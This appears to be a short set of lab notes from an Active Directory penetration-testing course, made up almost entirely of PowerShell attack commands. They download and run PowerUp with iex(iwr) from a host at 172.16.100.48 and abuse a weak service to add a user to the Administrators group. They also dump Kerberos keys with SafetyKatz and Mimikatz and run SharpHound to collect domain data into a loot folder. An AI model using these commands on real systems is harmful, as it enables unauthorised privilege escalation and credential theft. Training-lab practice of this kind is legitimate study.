
```powershell
Import-Module .\PowerUp.ps1
iex(iwr 'http://172.16.100.48/PowerUp.ps1' -useb)

Invoke-AllChecks
Get-ServiceUnquoted -Verbose
Get-ModifiableServiceFile -Verbose

Get-ModifiableService -Verbose

help  Invoke-ServiceAbuse

Invoke-ServiceAbuse -Name SNMPTRAP -UserName "dcorp\student548" -Verbose

net1 localgroup Administrators
```

```powershell
C:\Users\Public\Loader.exe -path C:\Users\Public\SafetyKatz.exe -args sekurlsa::evasive-keys exit
```

```powershell
. C:\Users\Public\Invoke-MimiEx-vault.ps1
```

> In a privileged shell

 ```powershell
C:\Users\Public\\Loader.exe -Path C:\Users\Public\\SharpHound.exe -args --collectionmethods Group,GPOLocalGroup,Session,Trusts,ACL,Container,ObjectProps,SPNTargets,CertServices --excludedcs --zipfilename shout
```

> Copy over to A:\loot